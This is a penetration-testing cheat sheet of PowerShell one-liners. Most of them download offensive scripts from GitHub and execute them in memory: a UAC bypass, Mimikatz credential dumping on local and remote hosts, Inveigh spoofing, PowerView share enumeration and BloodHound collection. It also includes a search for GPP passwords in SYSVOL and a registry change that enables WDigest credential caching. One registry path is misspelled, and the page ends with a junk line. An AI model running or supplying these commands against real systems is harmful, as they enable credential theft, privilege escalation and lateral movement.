---
description: Collection of PowerShell one-liners to use at various stages of testing.
---

# One-liners

## Powershell <a href="#invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command" id="invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command"></a>

### Invoke-BypassUAC and start PowerShell prompt as Administrator \[Or replace to run any other command] <a href="#invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command" id="invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command"></a>

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
```

### Invoke-Mimikatz: Dump credentials from memory

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

### Import Mimikatz Module to run further commands

```powershell
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
```

### Invoke-MassMimikatz: Use to dump creds on remote host

replace $env:computername with target server name(s)\*\*

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
```

### PowerUp: Privilege escalation checks

```powershell
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
```

### Invoke-Inveigh and log output to file

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"
```

Invoke-ShareFinder and print output to file

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
```

### Import PowerView Module to run further commands

```powershell
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
```

### Invoke-Bloodhound

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
```

### Find GPP Passwords in SYSVOL

```powershell
findstr /S cpassword $env:logonserver\sysvol\*.xml findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
```

### Run Powershell prompt as a different user, without loading profile to the machine

replace DOMAIN and USER\*\*

```powershell
runas /user:DOMAIN\USER /noprofile powershell.exe
```

### Insert reg key to enable Wdigest on newer versions of Windows

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
```

SOme shit fbudskjagfblsudg
